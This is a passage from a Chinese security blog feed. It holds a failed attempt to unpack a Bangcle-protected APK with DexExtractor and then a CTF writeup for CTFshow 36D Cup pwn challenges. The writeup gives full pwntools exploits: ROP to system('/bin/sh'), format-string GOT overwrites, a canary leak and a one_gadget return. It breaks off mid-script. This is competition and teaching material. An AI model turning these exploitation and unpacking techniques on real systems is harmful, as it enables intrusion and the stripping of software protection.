        <content type="html"><![CDATA[<p>承接上文<a href="https://www.mrskye.cn/archives/125/">第二届网鼎杯 Writeup</a>，使用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>进行脱壳。作者在 github 上的说明不太详细，就百度找到了<a href="https://www.jianshu.com/p/a27cc752e750">操作向-DexExtractor的使用</a>这篇文章。依据文章和作者的介绍开始配置环境。</p><h2 id="AVD-配置"><a href="#AVD-配置" class="headerlink" title="AVD 配置"></a>AVD 配置</h2><p>DexExtractor 的使用需要替换 sdk 中的<code>system-images\android-19\default\armeabi-v7a\system.img</code>为作者版本，如果需要在其他安卓版本使用，需要自行编译对应版本的<code>system.img</code>。</p><p>有现成轮子就直接用了，<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>作者编译的<code>system.img</code>是<strong>android 4.4 、api-19</strong>版本。但是 AS API-19 的有三个版本，README 中没指明。<a href="https://www.jianshu.com/p/a27cc752e750">操作向-DexExtractor的使用</a>里面写着用非 google api 版本，就尝试性使用。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-QMtoW1sGIvnTv5KO.png"></p><p>创建 AVD 完成后，未修改任何文件，测试虚拟机可用性。提示报错有两条，其中一条是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot find avd system path please define android sdk root</span><br></pre></td></tr></table></figure><p>sdk 的系统变量我是配置正确的，重启 AS 错误解决。再次运行报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Emulator: emulator: ERROR: This AVD&#x27;s configuration is missing a kernel file! Please ensure the file &quot;kernel-ranchu&quot; is in the same location as your system image.</span><br><span class="line">Emulator: emulator: ERROR: ANDROID_SDK_ROOT is defined (D:\Android\Sdk) but cannot find kernel file in D:\Android\Sdk\system-images\ sub directories</span><br></pre></td></tr></table></figure><p>报错没有找到 <code>kernel-ranch</code> 内核文件。百度谷歌后有几种解决方法：</p><ol><li><p>将位于<code>Sdk\system-images\android-19\default\armeabi-v7a</code> 的kernel-qemu 重命名为 kernel-ranchu 。</p><p><strong>实测无效</strong>，重命名后报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PANIC: Unknown AVD name [Pixel], use -list-avds to see valid list.</span><br><span class="line">HOME is defined but there is no file Pixel.ini in $HOME\.android\avd</span><br></pre></td></tr></table></figure></li><li><p>将 sdk 镜像下的<code>Sdk\system-images\android-19\default\armeabi-v7a</code> 全部文件复制到 AVD 的目录<code>.android\avd\Pixel_2_API_19_2.avd</code>下。</p><p><strong>实测无效</strong>，报错与复制前一样。</p></li></ol><p>最后在 stackoverflow 找到两篇帖子 <a href="https://stackoverflow.com/questions/9712605/emulator-error-this-avds-configuration-is-missing-a-kernel-file">Emulator error: This AVD’s configuration is missing a kernel file</a>和<a href="https://stackoverflow.com/questions/51897046/mac-and-panic-missing-emulator-engine-program-for-arm-cpu">Mac and “PANIC: Missing emulator engine program for ‘arm’ CPU.”</a>，解决方法：在启动 AVD 时，指定 kernel-qemu 为内核则可以启动。</p><blockquote><p>原文如下：<br>author：shizhen<br>See my answer for the Android Studio environment, Mac and “PANIC: Missing emulator engine program for ‘arm’ CPU.”.</p><p>To solve this problem, you need to specify the -kernel path manually. i.e.</p><p>$ ~/Library/Android/sdk/emulator/emulator  @Galaxy_Nexus_Jelly_Bean_API_16 -kernel ~/Library/Android/sdk/system-images/android-16/default/armeabi-v7a/kernel-qemu<br>Remember to change the emulator name Galaxy_Nexus_Jelly_Bean_API_16 to your own emulator name.</p><p>Below command is to check the emulators available for command line.</p><p>$ ~/Library/Android/sdk/emulator/emulator -list-avds<br>And also, ensure that your emulator path is correct, i.e. the one located at ~/Library/Android/sdk/emulator/</p></blockquote><p>然后查阅 android 官方的<a href="https://developer.android.com/studio/run/emulator-commandline">开发手册</a>，找到关于参数 kernel 的描述：</p><blockquote><p>使用特定的模拟内核。如果您未指定路径，则模拟器将在系统目录中查找。如果您未指定此选项，则默认为 kernel-ranchu。如需了解详情，请参阅 AVD 系统目录。使用 ‑show‑kernel 选项查看内核调试消息。</p></blockquote><p>当没有指定 kernel 参数时就默认使用 kernel-ranchu 。而 armeabi-v7a  里面只有 kernel-qemu 。而如果下载的镜像有 google-api 的标签，则有 kernel-ranchu 。（在同一页文档中也找到 kernel-ranchu 是最新版本的 QEMU 2 模拟器。）</p><p>但是使用镜像带有 google-api 的镜像，没有 dump dex 的 logcat，脱壳不成功。</p><p>手动指定 AVD 的启动内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -avd avd_name -kernel kernel-qemu</span><br></pre></td></tr></table></figure><p>报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PANIC: Missing emulator engine program for &#x27;arm&#x27; CPU.</span><br></pre></td></tr></table></figure><p>原因可能是 sdk/tools 下缺少某些文件，我的解决方法是将 <code>sdk/emulator</code> 全部文件（夹），复制到 <code>sdk/tools</code>，重名文件都选择替换。</p><p>成功启动 AVD 。</p><h2 id="添加读写权限"><a href="#添加读写权限" class="headerlink" title="添加读写权限"></a>添加读写权限</h2><p>apktools 反编译后，在 AndroidManifest.xml manifest 标签内添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>保存后回编译 apk 。</p><h2 id="dump-dex"><a href="#dump-dex" class="headerlink" title="dump dex"></a>dump dex</h2><p>按照<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a> readme 描述当在 logcat 中查看到类似于：(x为包名)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E/dalvikvm(4396): --pacthed-- , /sdcard/xxxxxxxxxxxxxxxxx.dex</span><br></pre></td></tr></table></figure><p>将 dex 文件拷贝到本机，然后用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>里面的 Decode.jar 对 dex 解码。</p><p>再用 <a href="https://bitbucket.org/JesusFreke/smali/downloads?tab=downloads">baksmail.jar</a> 将 dex 转 smali 。</p><p>计划设想很美好，但是 apk 怎么都运行不了， 错误提示 no support xxxx 。</p><p>猝~</p><h2 id="梆梆加固脱壳实战文章"><a href="#梆梆加固脱壳实战文章" class="headerlink" title="梆梆加固脱壳实战文章"></a>梆梆加固脱壳实战文章</h2><ul><li><a href="https://segmentfault.com/a/1190000022415728">脱壳再打包某梆梆免费加固APP</a></li><li><a href="https://www.cnblogs.com/jiaoxiake/p/6818786.html">android脱壳之DexExtractor原理分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 网鼎杯 </tag>
            
            <tag> 脱壳 </tag>
            
            <tag> 梆梆加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow 36D杯 Writeup</title>
      <link href="archives/105/"/>
      <url>archives/105/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>[scode type=”red”]非洲人怎么开容器都连不上所以 wp 都是本地。</p><p>[/scode]</p><p>[scode type=”green”]看完大佬 wp 了解到远程 docker 会过滤空格，不能使用<code>cat flag</code>，需要改用<code>base64&lt;flag</code>。因此这篇水文没有参考意义，去看大佬的 wp 吧~</p><p>膜拜大佬师傅们的WP：</p><p><a href="http://taqini.space/2020/05/04/ctfshow-36d-pwn-wp">taqini</a></p><p><a href="https://fmyy.pro/2020/05/04/Competition/36DCTF">风沐云烟</a></p><p>[/scode]</p><h3 id="Pwn-签到"><a href="#Pwn-签到" class="headerlink" title="Pwn 签到"></a>Pwn 签到</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出</strong></p><p>gets 函数栈溢出，程序只开启 NX 保护。漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets((__int64)&amp;v4, <span class="number">0LL</span>);<span class="comment">//溢出点</span></span><br><span class="line">  system(<span class="string">&quot;echo hello wrold!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序有 system 函数，就 gets 将 /bin/sh 写入到 bss 段，然后再调用。</p><p>**完整 exp **</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;124.156.121.112&quot;,28031)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004004ce</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006d1</span></span><br><span class="line">start = <span class="number">0x400510</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x601069</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x601069</span>) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hello wrold!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>远程环境过滤了空格等，我非洲人就没有看到过远程长什么样！！！</p></blockquote><p>[/collapse]</p><h3 id="Pwn-MagicString"><a href="#Pwn-MagicString" class="headerlink" title="Pwn_MagicString"></a>Pwn_MagicString</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出</strong></p><p>emmm这题和签到题怎么这么雷同，一样的思路，一样的方法。</p><p><strong>完整 exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.156.121.112&quot;</span>,<span class="number">28061</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">ret = <span class="number">0x00000000004004d1</span></span><br><span class="line">bss = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x2a8</span><span class="comment"># + p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;I want a girlfriend!\n&quot;</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line"><span class="comment">#p.sendlineafter(&quot;I want a girlfriend!\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>远程环境过滤了空格等，我非洲人就没有看到过远程长什么样！！！</p></blockquote><p>[/collapse]</p><h3 id="Pwn-babyFmtstr"><a href="#Pwn-babyFmtstr" class="headerlink" title="Pwn_babyFmtstr"></a>Pwn_babyFmtstr</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：格式化字符串</strong></p><p>格式化字符串长度不大于 0x32 ，漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400D0A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input name:&quot;</span>);</span><br><span class="line">  myiput((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>, <span class="number">0x32</span>LL, sleep);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> v0;                                    <span class="comment">// 返回复制字符串的指针地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中没有 system 和 /bin/sh 字符串，也没有后门函数，需要泄露函数地址。调试后得出：第一个可控字符偏移是<strong>8</strong>，main 返回地址 __libc_start_main 偏移是<strong>25</strong>。</p><p>泄露出地址后还需要 rop 回到 main 进行修改地址。因为格式化字符串长度有限制，所以尽量选择差异较小的 got 修改。main 地址是 <strong>0x400E93</strong> ，刚好与 plt 表前几位相同，所以找那些程序中未运行过但即将运行的函数修改，比如 free 。</p><p>free 未运行过，因此 got.plt 会指向到 plt 表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x602040] free@GLIBC_2.2.5 -&gt; 0x4009d6 (free@plt+6)</span><br></pre></td></tr></table></figure><p>将函数</p><p>所以构造第一条 payload ，将 free got 覆写为 main ，然后泄露出 main 返回地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%3731c%11$hn%25$paaaaaaa&quot;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br></pre></td></tr></table></figure><p>然后就是对某个函数 got 表覆写然后传 /bin/sh getshell 。我的做法是用第一轮输入覆写 strdup 为 system ，第二轮输入 /bin/sh ，当第二轮输入进行字符串复制 strdup(&amp;s) 时 /bin/sh 被传入 system 。</p><p>所以构造第二条 payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%4148765760c%11$nAAAAAAA&quot;</span> + p64(elf.got[<span class="string">&#x27;strdup&#x27;</span>])</span><br></pre></td></tr></table></figure><p>exp 完全不值得参考，远程网络环境不好还直接 %n 改数据(该打.png)。逐 bit 改的去看看 taqini 大佬的，或者爆破改 onegadget 的风沐云烟大佬。</p><p>[/collapse]</p><h3 id="Pwn-tang"><a href="#Pwn-tang" class="headerlink" title="Pwn_tang"></a>Pwn_tang</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：canary 绕过、格式化字符串</strong></p><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><h5 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">lookhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">5uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串长度在 5 字节，长度不足够修改，而且 got 表也不可写。</p><h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  lookhere();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_B80);                             </span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x190</span>uLL);</span><br><span class="line">  lookthere();</span><br><span class="line">  <span class="built_in">puts</span>(asc_BA8);                               </span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x60</span>uLL);<span class="comment">//栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出长度仅可以控制 rip 返回地址。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>格式化字符串漏洞可以泄露内存信息，字符串长度限制 5 字节，但还是可以泄露出 canary 值，从而绕过 canary 保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recv(<span class="number">18</span>))</span><br><span class="line">log.success(<span class="string">&quot;canart:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><p>绕过 canary 之后，就可以利用栈溢出控制程序流程。因为程序没有留后门，溢出空间非常小，就泄露 libc 地址，利用 onegadget getshell 。泄露 libc 地址还是利用格式化字符串漏洞，因此需要 rop 回到 main 。</p><p>main 函数是在 __libc_main_start 被调用，所以从返回地址找到 __libc_main_start 调用地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x555555554ab0                            xor    rbx, qword ptr fs:[0x28]</span><br><span class="line">   0x555555554ab9                            je     0x555555554ac0</span><br><span class="line">    ↓</span><br><span class="line">   0x555555554ac0                            add    rsp, 0x48</span><br><span class="line">   0x555555554ac4                            pop    rbx</span><br><span class="line">   0x555555554ac5                            pop    rbp</span><br><span class="line"> ► 0x555555554ac6                            ret             &lt;0x7ffff7a2d830; __libc_start_main+240&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> pdisass 0x7ffff7a2d830-0x20</span></span><br><span class="line"> ► 0x7ffff7a2d810 &lt;__libc_start_main+208&gt;    add    al, 0x25</span><br><span class="line">   0x7ffff7a2d812 &lt;__libc_start_main+210&gt;    add    byte ptr [rbx], al</span><br><span class="line">   0x7ffff7a2d814 &lt;__libc_start_main+212&gt;    add    byte ptr [rax], al</span><br><span class="line">   0x7ffff7a2d816 &lt;__libc_start_main+214&gt;    mov    rax, qword ptr [rip + 0x3a369b]</span><br><span class="line">   0x7ffff7a2d81d &lt;__libc_start_main+221&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a2d822 &lt;__libc_start_main+226&gt;    mov    edi, dword ptr [rsp + 0x14]</span><br><span class="line">   0x7ffff7a2d826 &lt;__libc_start_main+230&gt;    mov    rdx, qword ptr [rax]</span><br><span class="line">   0x7ffff7a2d829 &lt;__libc_start_main+233&gt;    mov    rax, qword ptr [rsp + 0x18]</span><br><span class="line">   0x7ffff7a2d82e &lt;__libc_start_main+238&gt;    call   rax</span><br></pre></td></tr></table></figure><p>从 0x7ffff7a2d82e 往上找到传参开始地址，将返回地址最后两位覆写为目标地址，即<code>0x7ffff7a2d830</code>–&gt;<code>0x7ffff7a2d816</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2main</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x16&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>再次进入 main 之后泄露 libc 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_240 = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_240:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_240))</span><br></pre></td></tr></table></figure><p>最后重写返回地址为 onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h5 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 